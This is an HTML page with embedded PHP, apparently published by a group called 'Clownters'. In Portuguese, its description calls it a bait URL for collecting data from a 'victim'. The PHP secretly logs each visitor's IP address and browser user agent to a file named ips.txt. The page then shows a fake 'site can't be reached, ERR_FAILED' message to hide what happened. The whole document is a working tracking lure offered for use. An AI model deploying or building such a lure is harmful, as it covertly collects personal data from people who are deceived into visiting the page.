<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"/>
<meta property="og:type" content="website"/>
<meta property="og:title" content="Clownters"/>
<meta content="https://user-images.githubusercontent.com/82988362/215275753-140fda88-c496-481b-add9-3c82968f6c4b.jpg" property="og:image">
<meta content="Organização Clownters" property="og:title">
<meta property="og:description" content="@MIke90s15 - Script que criar uma url chamativa com objetivo de coleta de dados assim que a vitima acessar"/>
<meta property="og:url" content="https://clownters.com" />
<title>Clownters</title>
<link rel="icon" href="https://raw.githubusercontent.com/mike90s15/cloud/main/Clownters/Imagens/IMG_20220225_170641_796.jpg">
  <style>
  body
  {
  background:#fff;
  color:#000;
  text-indet:2ch;
  }
  p
  {
  font-size:30px;
  }
  </style>
</head>
<body>
<!-- Clownters -->
<?php                                                           if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$file = 'ips.txt';
$fp = fopen($file, 'a');
fwrite($fp, "\033[1;34m  IP: \033[0;32m" . $ipaddress);
fwrite($fp, "\033[1;34m  Navegador: \033[0;32m" . $_SERVER['HTTP_USER_AGENT']);
fwrite($fp, "\n\n");
fclose($fp);
?>
  <h1>Não é possível acessar esse site</h1>
  <p class="center">
A conexão com internet foi recusada. <br>
Tente: Verificar a conexão
<br>
<br>
ERR_FAILED
  </p>
</body>
</html>
